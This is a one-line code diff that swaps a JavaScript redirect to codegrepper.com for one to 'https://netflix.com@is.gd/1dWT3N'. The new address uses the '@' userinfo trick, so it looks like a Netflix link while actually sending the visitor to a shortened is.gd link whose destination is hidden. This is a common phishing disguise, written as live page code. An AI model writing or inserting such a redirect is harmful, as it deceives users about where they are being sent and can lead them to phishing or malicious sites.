@@ -1,1 +1,1 @@
-window.location.replace("http://codegrepper.com");
+window.location.replace("https://netflix.com@is.gd/1dWT3N");
